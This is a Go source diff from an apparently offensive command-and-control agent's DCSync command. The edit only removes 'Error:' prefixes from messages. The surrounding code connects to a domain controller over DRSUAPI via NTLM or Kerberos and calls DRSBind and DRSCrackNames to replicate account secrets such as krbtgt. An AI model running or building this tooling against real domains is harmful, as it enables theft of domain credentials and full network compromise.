@@ -54,7 +54,7 @@ type dcsyncResult struct {
 
 func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: parameters required. Use -server <DC> -username <user> -password <pass> -target <account>")
+		return errorResult("parameters required. Use -server <DC> -username <user> -password <pass> -target <account>")
 	}
 
 	args, parseErr := unmarshalParams[dcsyncArgs](task)
@@ -63,11 +63,11 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Server == "" || args.Username == "" || (args.Password == "" && args.Hash == "") {
-		return errorResult("Error: server, username, and password (or hash) are required")
+		return errorResult("server, username, and password (or hash) are required")
 	}
 
 	if args.Target == "" {
-		return errorResult("Error: target account(s) required. Use -target Administrator or -target \"admin,krbtgt\"")
+		return errorResult("target account(s) required. Use -target Administrator or -target \"admin,krbtgt\"")
 	}
 
 	if args.Timeout <= 0 {
@@ -95,15 +95,15 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if len(targets) == 0 {
-		return errorResult("Error: no valid target accounts specified")
+		return errorResult("no valid target accounts specified")
 	}
 
 	useKerberos := strings.EqualFold(args.Auth, "kerberos") || strings.EqualFold(args.Auth, "krb5")
 	if useKerberos && args.DCHost == "" {
-		return errorResult("Error: dc_host (DC FQDN) is required for Kerberos auth (e.g. dc01.domain.local)")
+		return errorResult("dc_host (DC FQDN) is required for Kerberos auth (e.g. dc01.domain.local)")
 	}
 	if useKerberos && args.Domain == "" {
-		return errorResult("Error: domain is required for Kerberos auth")
+		return errorResult("domain is required for Kerberos auth")
 	}
 
 	if !useKerberos {
@@ -116,7 +116,7 @@ func dcsyncExecuteNTLM(args dcsyncArgs, targets []string) structs.CommandResult 
 	results, err := dcsyncViaSubprocess(args, targets)
 	zeroCredentials(&args.Password, &args.Hash)
 	if err != nil {
-		return errorf("Error: DCSync replication via NTLM against %s failed: %v", args.Server, err)
+		return errorf("DCSync replication via NTLM against %s failed: %v", args.Server, err)
 	}
 	return dcsyncFormatResults(args, targets, results, "NTLM")
 }
@@ -144,7 +144,7 @@ func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandRes
 		),
 	)
 	if err != nil {
-		return errorf("Error connecting to %s via DCE-RPC: %v", args.Server, err)
+		return errorf("connecting to %s via DCE-RPC: %v", args.Server, err)
 	}
 	defer cc.Close(ctx)
 
@@ -154,7 +154,7 @@ func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandRes
 		dcerpc.WithSecurityConfig(krbCfg),
 	)
 	if err != nil {
-		return errorf("Error creating DRSUAPI client: %v", err)
+		return errorf("creating DRSUAPI client: %v", err)
 	}
 
 	clientCaps := drsuapi.ExtensionsInt{
@@ -163,14 +163,14 @@ func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandRes
 	}
 	capsBytes, err := ndr.Marshal(&clientCaps, ndr.Opaque)
 	if err != nil {
-		return errorf("Error marshaling client capabilities: %v", err)
+		return errorf("marshaling client capabilities: %v", err)
 	}
 
 	bindResp, err := cli.Bind(ctx, &drsuapi.BindRequest{
 		Client: &drsuapi.Extensions{Data: capsBytes},
 	})
 	if err != nil {
-		return errorf("Error DRSBind to %s: %v", args.Server, err)
+		return errorf("DRSBind to %s: %v", args.Server, err)
 	}
 
 	var crackFormat uint32
@@ -200,12 +200,12 @@ func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandRes
 		},
 	})
 	if err != nil {
-		return errorf("Error DRSCrackNames: %v", err)
+		return errorf("DRSCrackNames: %v", err)
 	}
 
 	crackedReply, ok := cracked.Out.GetValue().(*drsuapi.MessageCrackNamesReplyV1)
 	if !ok || crackedReply == nil {
-		return errorResult("Error: unexpected DRSCrackNames response type")
+		return errorResult("unexpected DRSCrackNames response type")
 	}
 
 	var results []dcsyncResult
